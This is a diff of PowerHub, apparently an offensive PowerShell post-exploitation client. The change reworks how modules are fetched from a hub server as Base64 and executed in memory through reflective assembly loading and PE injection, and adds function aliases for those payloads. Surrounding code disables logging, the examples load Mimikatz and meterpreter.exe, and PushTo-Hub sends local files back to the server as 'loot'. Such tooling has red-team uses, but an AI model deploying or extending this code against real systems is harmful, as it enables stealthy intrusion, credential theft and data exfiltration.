@@ -7,11 +7,14 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
     {% include "powershell/disable-logging.ps1" %}
 }
 
+$FooterLeft = "{{VERSION}}"
+$FooterRight = "written by Adrian Vollmer, 2018-2022"
+$SpaceBuffer = " "*(64-2-$FooterLeft.Length-$FooterRight.Length)
 Write-Output @"
   _____   _____  _  _  _ _______  ______ _     _ _     _ ______
  |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
  |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
-                            written by Adrian Vollmer, 2018-2022
+$($FooterLeft, $SpaceBuffer, $FooterRight)
 Run 'Help-PowerHub' for help
 "@
 
@@ -100,9 +103,11 @@ function Unzip-Code {
 }
 
 function Update-HubModules {
+    Write-Verbose "Updating module list..."
     $ModuleList = Transport-String "ml"
-    Invoke-Expression "$ModuleList"
+    Invoke-Expression "$ModuleList"  | Out-Null
     $Global:PowerHubModules = $PowerHubModules
+    $PowerHubModules | Format-Table -AutoSize -Property N,Type,Name,Loaded
 }
 
 function Import-HubModule {
@@ -117,9 +122,9 @@ function Import-HubModule {
     New-Module -ScriptBlock $sb | Out-Null
 
     if ($?){
-        Write-Verbose ("[*] {0} imported." -f $Module.Name)
+        Write-Verbose ("{0} imported." -f $Module.Name)
     } else {
-        Write-Error ("[*] Failed to import {0}" -f $Module.Name)
+        Write-Error ("Failed to import {0}" -f $Module.Name)
     }
 }
 
@@ -154,48 +159,16 @@ function Get-HubModule {
 <#
 .SYNOPSIS
 
-Simply returns a hub module for further processing. Its only parameter  works
-similar to Load-HubModule. In fact, Load-HubModule calls Get-HubModule.
-
-.PARAMETER Expression
-
-See help of Load-HubModule.
-
-#>
-    Param(
-        [parameter(Mandatory=$true)]
-        [String]
-        $Expression
-    )
-
-    if ($Expression -match "^[0-9-,]+$") {
-        $indices = Convert-IntStringToArray($Expression)
-    } else {
-        $indices = [Int[]]($PowerHubModules | Where { $_.Name -match $Expression } | % {$_.N})
-    }
-
-    $result = @()
-    foreach ($i in $indices) {
-        if ($i -lt $PowerHubModules.length -and $i -ge 0) {
-            $result += $PowerHubModules[$i]
-        }
-    }
-    return $result
-}
-
-function Load-HubModule {
-<#
-.SYNOPSIS
-
 Transfers a module from the hub and imports it. It creates a web request to
-load the Base64 encoded module code.
+load the Base64 encoded module code. If the module has already been loaded, it
+simply returns the module object unless the "-Reload" flag is present.
 
 It refreshes the module list first, so keep this in mind when referring to
 modules by number.
 
 .DESCRIPTION
 
-Load-HubModule loads a module.
+Get-HubModule loads and returns a module.
 
 .PARAMETER Expression
 
@@ -205,10 +178,13 @@ Name.
 Alternatively, you can use the number of the module, separated by commas. Can
 contain a range such as "1,4-8".
 
+.PARAMETER Reload
+
+Force a reload of the module's code from the server.
 
 .EXAMPLE
 
-Load-HubModule "3"
+Get-HubModule "3"
 
 Description
 -----------
@@ -216,7 +192,7 @@ Transfers the code of module #3 from the hub and imports it.
 
 .EXAMPLE
 
-Load-HubModule Mimikatz
+Get-HubModule Mimikatz
 
 Description
 -----------
@@ -225,7 +201,7 @@ expression matches) from the hub and imports it.
 
 .EXAMPLE
 
-Load-HubModule "1,4-6"
+Get-HubModule "1,4-6"
 
 Description
 -----------
@@ -242,28 +218,53 @@ Transfers the code of all modules from the hub and imports them.
 .NOTES
 
 Use the '-Verbose' option to print detailed information.
-#>
 
+#>
     Param(
-        [parameter(Mandatory=$true)]
-        [String]
-        $Expression
+        [parameter(Mandatory=$true)] [String] $Expression,
+        [parameter(Mandatory=$false)] [Switch] $Reload
     )
 
-    $result = @()
-    Get-HubModule $Expression | % {
-        $args = @{"m"=$_.N}
-        # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
-        if ($_.Type -eq 'ps1') {
-            $_.Code = Transport-String "m" $args
-            Import-HubModule $_
-        } else {
-            $_.Code = Transport-String "m" $args $True
-        }
-        $_.Loaded = $True
-        $result += $_
+    if ($Expression -match "^[0-9-,]+$") {
+        $indices = Convert-IntStringToArray($Expression)
+    } else {
+        $indices = [Int[]]($PowerHubModules | Where { $_.Name -match $Expression } | % {$_.N})
     }
-    $result
+
+    $result = @()
+    foreach ($i in $indices) {
+        if ($i -lt $PowerHubModules.length -and $i -ge 0) {
+            $module = $PowerHubModules[$i]
+            if (($module.Loaded -eq $False) -or $Reload) {
+                # Load the module from server
+                Write-Verbose "Loading module $($module.name)..."
+                $transport_args = @{"m"=$module.N}
+                # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
+                if ($module.Type -eq 'ps1') {
+                    $module.Code = Transport-String "m" $transport_args
+                    Import-HubModule $module
+                } else {
+                    $module.Code = Transport-String "m" $transport_args $True
+                    # Get Basename
+                    if ($Module.Name.Contains('/')) {
+                        $AliasName = $Module.Name.split('/')
+                        $AliasName = $AliasName[$AliasName.Length - 1]
+                    } else {
+                        $AliasName = $Module.Name
+                    }
+                    # Create alias
+                    if ($module.Type -eq 'dotnet') {
+                        New-DotNetAlias $module -Name $AliasName | Out-Null
+                    } elseif ($module.Type -eq 'pe') {
+                        New-ExeAlias $module -Name $AliasName | Out-Null
+                    }
+                }
+                $module.Loaded = $True
+            }
+            $result += $module
+        }
+    }
+    return $result
 }
 
 
@@ -275,15 +276,15 @@ Executes a loaded exe module in memory using Invoke-ReflectivePEInjection, which
 
 .PARAMETER Module
 
-A PowerHub module object of type 'exe'.
+A PowerHub module object of type 'pe'.
 
 .PARAMETER ExeArgs
 
-A string containing arguments which are passed to the exe module.
+A string containing arguments which are passed to the PE module.
 
 .PARAMETER OnDisk
 
-If this switch is enabled, the exe module will be copied to disk and executed conventionally.
+If this switch is enabled, the PE module will be copied to disk and executed conventionally.
 
 WARNING: Endpoint protection WILL catch malware this way.
 
@@ -294,7 +295,7 @@ Run-Exe $hubModule
 Description
 -----------
 
-Execute some Hub Module of type 'exe' in memory.
+Execute some Hub Module of type 'pe' in memory.
 
 .EXAMPLE
 
@@ -303,7 +304,7 @@ Load-HubModule meterpreter.exe | Run-Exe
 Description
 -----------
 
-Load the exe module with the name 'meterpreter.exe' in memory and run it.
+Load the PE module with the name 'meterpreter.exe' in memory and run it.
 
 .EXAMPLE
 
@@ -375,7 +376,7 @@ Load-HubModule meterpreter.exe | Save-HubModule
 Description
 -----------
 
-Load the exe module with the name 'meterpreter.exe' in memory and save it to disk
+Load the PE module with the name 'meterpreter.exe' in memory and save it to disk
 #>
     Param(
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
@@ -410,7 +411,7 @@ This might trigger the anti-virus.
 
 .PARAMETER Module
 
-A PowerHub module object of type 'exe' (must be a .NET exe).
+A PowerHub module object of type 'dotnet'.
 
 .PARAMETER OutFile
 
@@ -452,6 +453,9 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
         [parameter(Mandatory=$false)] [String[]] $Arguments = @()
     )
 
+    {# Set CWD of the process to that of the powershell session #}
+    [Environment]::CurrentDirectory = Get-Location
+
     foreach ($m in $Module) {
         $code = $m.Code
         $a = [Reflection.Assembly]::Load([byte[]]$code)
@@ -479,6 +483,69 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
     }
 }
 
+function New-DotNetAlias {
+<#
+.SYNOPSIS
+
+Add an alias that acts as a wrapper for 'Get-HubModule|Run-DotNETExe'.
+
+.PARAMETER Module
+
+A PowerHub module object of type "dotnet".
+
+.PARAMETER Name
+
+Name of the new alias. Default: the module's name.
+
+#>
+    Param(
+        [parameter(Mandatory=$false)] [String] $Name,
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHub.Module")] $Module
+    )
+    $Function = {
+        $Module | Run-DotNETExe -Arguments ([string[]]$args)
+    }
+    if ($Name) {
+        $FuncName = $Name
+    } else {
+        $FuncName = $Module.Name
+    }
+    $Module.Alias = $FuncName
+    New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
+}
+
+function New-ExeAlias {
+<#
+.SYNOPSIS
+
+Add an alias that acts as a wrapper for 'Get-HubModule|Run-Exe'.
+
+.PARAMETER Module
+
+A PowerHub module object of type "pe".
+
+.PARAMETER Name
+
+Name of the new alias. Default: the module's name.
+
+#>
+    Param(
+        [parameter(Mandatory=$false)] [String] $Name,
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHub.Module")] $Module
+    )
+    $Function = {
+        $Module | Run-Exe -ExeArgs ([string[]]$args -join " ")
+    }
+    if ($Name) {
+        $FuncName = $Name
+    } else {
+        $FuncName = $Module.Name
+    }
+    $Module.Alias = $FuncName
+    New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
+}
 
 function Run-Shellcode {
 <#
@@ -679,7 +746,11 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 {{'Write-Debug "Pushing $File..."'|debug}}
                 $abspath = (Resolve-Path $file).path
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
-                if ($Name) { $filename = $name } else { $filename = $file }
+                if ($Name) {
+                    $filename = $name
+                } else {
+                    $filename = Split-Path $file -leaf
+                }
 
                 Send-Bytes -LootId $LootId $fileBin $filename
 
@@ -850,6 +921,7 @@ The following functions are available (some with short aliases):
   * Load-HubModule (lhm)
   * Get-HubModule (ghm)
   * Update-HubModules (uhm)
+  * Get-SysInfo
   * Get-Loot (glo)
   * Run-Exe (re)
   * Run-DotNETExe (rdne)
@@ -863,6 +935,7 @@ Use 'Get-Help' to learn more about those functions.
 }
 
 try { New-Alias -Name pth -Value PushTo-Hub } catch { }
+try { New-Alias -Name Load-HubModule -Value Get-HubModule } catch { }
 try { New-Alias -Name lhm -Value Load-HubModule } catch { }
 try { New-Alias -Name ghm -Value Get-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
